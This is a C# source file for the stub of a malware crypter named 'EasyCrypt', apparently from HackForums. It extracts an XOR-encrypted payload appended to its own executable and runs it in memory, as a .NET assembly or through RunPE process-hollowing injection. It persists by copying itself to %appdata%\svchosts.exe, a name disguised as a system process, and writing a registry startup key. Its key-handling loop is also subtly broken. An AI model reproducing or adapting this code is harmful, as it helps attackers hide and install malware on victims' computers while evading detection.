﻿using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using EasyStub.EasyCrypt.Core;
using HackForums.gigajew;
using Microsoft.Win32;

namespace EasyStub
{
    class App
    {
        [STAThread]
        static int Main(string[] argv)
        {
            string currentLocation = Assembly.GetEntryAssembly().Location;
            FileInfo currentExecutable = new FileInfo(currentLocation);
            EofData settings;

            using (FileStream currentStream = currentExecutable.OpenRead())
            {
                int e_lfanew = 0;
                byte[] e_lfanewData = new byte[4];
                currentStream.Seek(60, SeekOrigin.Begin);
                currentStream.Read(e_lfanewData, 0, e_lfanewData.Length);
                e_lfanew = BitConverter.ToInt32(e_lfanewData, 0);

                int numberOfSymbols = 0;
                byte[] numberOfSymbolsData = new byte[4];
                currentStream.Seek(e_lfanew + 0x10, SeekOrigin.Begin);
                currentStream.Read(numberOfSymbolsData, 0, numberOfSymbolsData.Length);
                numberOfSymbols = BitConverter.ToInt32(numberOfSymbolsData, 0);

                if (numberOfSymbols == 0)
                {
                    MessageBox.Show("Failed to locate data", "EasyCrypt Stub", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return -1;
                }

                currentStream.Seek(numberOfSymbols, SeekOrigin.Begin);
                try
                {
                    settings = EofData.Deserialize(currentStream);
                }
                catch (Exception exception)
                {
                    MessageBox.Show("Failed to deserialize data\r\nMessage: " + exception.Message + "\r\nStacktrace: " + exception.StackTrace, "EasyCrypt Stub", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return -1;
                }
            }

            // decrypt payload
            byte[] decryptedData = EncryptDecryptData(settings.EncryptedPayload, settings.EncryptionKey);

            try
            {
                // load assembly
                Assembly assembly = Thread.GetDomain().Load(decryptedData);

                // make sure we got the right amount of parameters (gui/console)
                object[] parameters = new object[1];
                if (assembly.EntryPoint.GetParameters().Length > 0)
                {
                    parameters[0] = new string[] { null };
                }
                else
                {
                    parameters = null;
                }

                // start assembly
                ThreadPool.QueueUserWorkItem((object o) =>
                {
                    assembly.EntryPoint.Invoke(null, parameters);
                }, null);
            }
            catch
            {
                // can't be loaded, probably a native executable
                ThreadPool.QueueUserWorkItem((object o) =>
                {
                    x86RunPE.Inject(currentLocation, decryptedData, null, true);
                }, null);
            }

            // install
            if (settings.AutomaticStartup) {
                string desiredLocation = Environment.ExpandEnvironmentVariables("%appdata%\\svchosts.exe");
                if (desiredLocation != currentLocation && !File.Exists(desiredLocation))
                {
                    File.Move(currentLocation, desiredLocation);
                    RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows");
                    key.SetValue("Load", desiredLocation);
                }
            }

            return 0;
        }

        static byte[] EncryptDecryptData(byte[] inputData, string key)
        {
            byte[] encryptedData = new byte[inputData.Length];
            byte[] keyData = new byte[key.Length];
            for (int i = 0; i < keyData.Length; i++)
                keyData[i] = (byte)keyData[i];
            for (int i = 0; i < inputData.Length; i++)
                encryptedData[i] = (byte)(inputData[i] ^ (keyData[i % keyData.Length] % 256));
            return encryptedData;
        }
    }
}
